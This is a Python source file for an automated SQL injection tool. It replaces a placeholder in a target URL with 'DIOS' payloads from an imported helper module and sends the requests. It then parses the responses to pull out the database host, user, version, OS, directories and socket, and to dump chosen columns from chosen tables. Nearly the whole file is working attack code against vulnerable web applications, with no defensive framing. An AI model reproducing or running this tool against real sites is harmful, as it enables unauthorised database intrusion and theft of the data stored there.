import re
import requests
from .Dios import Dios

class Sqli:

    def __init__(self, url):
      self.url           = url
      self.result = ''

    def get_result(self,body):
        sqli_helper = re.search("<sqli-helper>(.*)</sqli-helper>",body, re.DOTALL)

        if ( sqli_helper ):
            return sqli_helper.group(1)
        else:
            raise Exception({
                    "status": False,
                    "message": "Response sql injectin do not match"
                })
    def getResultByTag(self, tag):
        sqli_helper = re.search(f"<{tag}>(.*)</{tag}>",self.result, re.DOTALL)
        return sqli_helper.group(1) if bool(sqli_helper) else "Can't get information"

    def information(self, level=1):
        dios = Dios().get_information()
        response = requests.get(self.url.replace('*',dios))
        if level == 1:
            try:
                sqli_helper = self.get_result(response.text)

                hostname        = re.search("<hostname\(\)>(.*)</hostname\(\)>", sqli_helper, re.DOTALL)
                port            = re.search("<port\(\)>(.*)</port\(\)>", sqli_helper, re.DOTALL)
                user            = re.search("<user\(\)>(.*)</user\(\)>", sqli_helper, re.DOTALL)
                schema          = re.search("<schema\(\)>(.*)</schema\(\)>", sqli_helper, re.DOTALL)
                version         = re.search("<version>(.*)</version>", sqli_helper, re.DOTALL)
                os_version      = re.search("<os_version>(.*)</os_version>", sqli_helper, re.DOTALL)
                mechine_version = re.search("<mechine_version>(.*)</mechine_version>", sqli_helper, re.DOTALL)
                base_dir        = re.search("<base_dir>(.*)</base_dir>", sqli_helper, re.DOTALL)
                data_dir        = re.search("<data_dir>(.*)</data_dir>", sqli_helper, re.DOTALL)
                ssl             = re.search("<ssl>(.*)</ssl>", sqli_helper, re.DOTALL)
                openssl         = re.search("<openssl>(.*)</openssl>", sqli_helper, re.DOTALL)
                symlink         = re.search("<symlink>(.*)</symlink>", sqli_helper, re.DOTALL)
                socket          = re.search("<socket>(.*)</socket>", sqli_helper, re.DOTALL)

                hostname        = hostname.group(1)         if bool(hostname)           else "can't get information"
                port            = port.group(1)             if bool(port)               else "can't get information"
                user            = user.group(1)             if bool(user)               else "can't get information"
                schema          = schema.group(1)           if bool(schema)             else "can't get information"
                version         = version.group(1)          if bool(version)            else "can't get information"
                os_version      = os_version.group(1)       if bool(os_version)         else "can't get information"
                mechine_version = mechine_version.group(1)  if bool(mechine_version)    else "can't get information"
                base_dir        = base_dir.group(1)         if bool(base_dir)           else "can't get information"
                data_dir        = data_dir.group(1)         if bool(data_dir)           else "can't get information"
                ssl             = ssl.group(1)              if bool(ssl)                else "can't get information"
                openssl         = openssl.group(1)          if bool(openssl)            else "can't get information"
                symlink         = symlink.group(1)          if bool(symlink)            else "can't get information"
                socket          = socket.group(1)           if bool(socket)             else "can't get information"
            except Exception as identifier:
                raise Exception(identifier)
 
        return {
                    "hostname": hostname,
                    "port": port,
                    "user": user,
                    "schema": schema,
                    "version": version,
                    "os_version": os_version,
                    "mechine_version": mechine_version,
                    "base_dir": base_dir,
                    "data_dir": data_dir,
                    "ssl": ssl,
                    "openssl": openssl,
                    "symlink": symlink,
                    "socket": socket 
        }
    
    def dump_data(self, tables, columns, database, level=1):
        if level==1:
            query           = Dios().dump_data(tables, columns, database)
            query_builder   = Dios().build(query)
            response        = requests.get(self.url.replace('*',query_builder))
            # try:
            result          = self.get_result(response.text)
            
            sqli_array      = result.split('<end/>,')

            realResult              = dict()
            realResult['columns']   = columns
            realResult['data']      = list()
            for sqli in sqli_array:
                self.result = sqli
                result      = dict()

                for column in columns:
                    result[column] = self.getResultByTag(column)
                realResult['data'].append(result)
            return realResult
            # except Exception as identifier:
            #     return identifier